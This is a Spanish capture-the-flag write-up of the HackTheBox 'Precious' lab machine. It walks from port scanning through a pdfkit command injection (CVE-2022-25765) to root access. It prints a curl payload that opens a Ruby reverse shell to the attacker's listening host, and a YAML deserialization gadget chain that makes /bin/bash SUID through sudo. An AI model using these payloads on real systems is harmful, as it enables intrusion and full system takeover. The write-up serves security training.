---
title: HackTheBox Precious Writeup
published: true
---

La máquina Precious, es una máquina de HackTheBox en la que mediante la explotación de esta conseguiremos la flag del usuario y la de root.


# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para el siguiente escaneo:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
❯ nmap -p- --open --min-rate 5000 -T5 -n -vvv -Pn 10.10.11.189
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 12:25 EDT
Initiating Connect Scan at 12:25
Scanning 10.10.11.189 [65535 ports]
Discovered open port 80/tcp on 10.10.11.189
Discovered open port 22/tcp on 10.10.11.189
Completed Connect Scan at 12:26, 23.98s elapsed (65535 total ports)
Nmap scan report for 10.10.11.189
Host is up, received user-set (0.13s latency).
Scanned at 2023-03-16 12:25:48 EDT for 24s
Not shown: 48752 filtered tcp ports (no-response), 16781 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.01 seconds

```

Tenemos dos puertos abiertos, analizaremos la versión y servicio de los mismos con nmap para intentar sacar más información:

```bash
❯ nmap -p22,80 -sCV 10.10.11.189 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 12:29 EDT
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Convert Web Page to PDF
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds

```

# [](#header-1)Acceso al sistema

Puesto que está el puerto 80 abierto, nos dirigimos a la página y observamos un convertidor de Web Page a PDF, tal como indica el comando anterior.

Al inspeccionar la página no encuentro nada raro.

Vamos a intentar buscar directorios ocultos con gobuster:

```bash
❯ gobuster dir -u http://precious.htb -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://precious.htb
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2023/03/16 12:33:35 Starting gobuster in directory enumeration mode
===============================================================
                                
===============================================================
2023/03/16 12:34:38 Finished
===============================================================
```

No nos reporta ningún directorio oculto.

Puesto que podemos ejecutar una url, nos montamos un servidor e introducimos nuestra ip en la página:

> ❯ python3 -m http.server 80

A continuacón:

> http://(NUESTRA_IP)

Nos reporta un pdf, lo descargamos. 

Mediante la herramienta exiftool podemos analizar los metadatos del mismo:

```bash
❯ exiftool vcuo7wyz55p42n8nvsqzuuhoy4rd7ng4.pdf
ExifTool Version Number         : 12.44
File Name                       : vcuo7wyz55p42n8nvsqzuuhoy4rd7ng4.pdf
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2023:03:16 12:47:59-04:00
File Access Date/Time           : 2023:03:16 12:47:59-04:00
File Inode Change Date/Time     : 2023:03:16 12:47:59-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

Tras investigar un poco, en la última línea reporta:

> pdfkit v0.8.6

Buscamos si hay alguna vulnerabilidad mediante: CVE pdfkit v0.8.6

Nos reporta el CVE 2022-25765

Este CVE representa que en esta versión es vulnerable a Command Injection mediante curl mediante el siguiente comando indicando en TARGET_ADDRESS la ip de la máquina víctima, en LOCAL-ADDRESS nuestra ip y en LOCAL-PORT el puerto por el que estaremos en escucha:

> curl 'TARGET_ADDRESS' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_ADDRESS' -H 'Connection: keep-alive' -H 'Referer: TARGET_ADDRESS' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60'

Antes de lanzar la petición hay que mantener el servidor con:

> python -m http.server 80

Además de estar mediante netcat en escucha por el puerto indicado anteriormente:

> nc -lnvp 4444

Lo ejecutamos y conseguimos acceso como ruby.

```bash
whoami
ruby
```

Realizamos el <a href="https://jgarcix.github.io/Tratamiento-de-la-tty"> tratamiento de la TTY.</a> como siempre para poder hacerla interactiva.

# [](#header-1)Escalada de privilegios

A continuación, buscamos en el usuario ruby y encontramos el directorio oculto .bundle en el que hay un archivo que contiene la contraseña de henry.

```bash
ruby@precious:/var/www/pdfapp$ cd /home
ruby@precious:/home$ ls
henry  ruby
ruby@precious:/home$ cd /home/ruby
ruby@precious:~$ ls
ruby@precious:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .bundle  .cache  .profile
ruby@precious:~$ cd /home/ruby/.bundle
ruby@precious:~/.bundle$ ls
config
ruby@precious:~/.bundle$ cat config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:???????????"
ruby@precious:~/.bundle$
```

Accedemos mediante ssh con la contraseña:

```bash
ruby@precious:~/.bundle$ ssh henry@10.10.11.189
The authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.
ECDSA key fingerprint is SHA256:kRywGtzD4AwSK3m1ALIMjgI7W2SqImzsG5qPcTSavFU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.189' (ECDSA) to the list of known hosts.
henry@10.10.11.189's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Mar 16 12:17:46 2023 from 10.10.14.78
henry@precious:~$ whoami
henry
henry@precious:~$ 
```

En /henry tenemos la flag del usuario en el archivo user.txt

Hacemos sudo -l para ver que comandos podemos ejecutar como root. Nos reporta lo siguiente:

```bash
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Abrimos update_dependencies.rb y nos fijamos que está usando YAML.load, por lo que es vulnerable a "YAML Deserialization Attack". <a href="https://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md">Más información sobre este tipo de ataque.</a> 

```bash
henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

Podemos explotarlo creando un archipo dependencies.yml en /henry y ejecutando /opt/update_dependencies.rb como sudo con la finalidad de que el binario /bin/bash tenga permisos SUID.

```bash
dependencies.yml = ---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

Lo ejecutamos como sudo:

```bash
henry@precious:~$ ls
dependencies.yml  user.txt
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
```

Funciona, a continuación cambiamos el archivo dependencies.yml y añadimos "chmod +s /bin/bash" en "git_set:" para que el permiso sea SUID:

```bash
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```

Ejecutamos otra vez el binario y /bin/bash -p para tener una shell como root. Localizamos así la flag de root en el archivo en /root root.txt

```bash
henry@precious:~$ /bin/bash -p
bash-5.1# ls
dependencies.yml  user.txt
bash-5.1# cd /root
bash-5.1# ls
root.txt
bash-5.1# cat root.txt 
8abcbf32ac6a18546???????????????
```

Muchas gracias por leer este writeup, espero que te haya gustado!
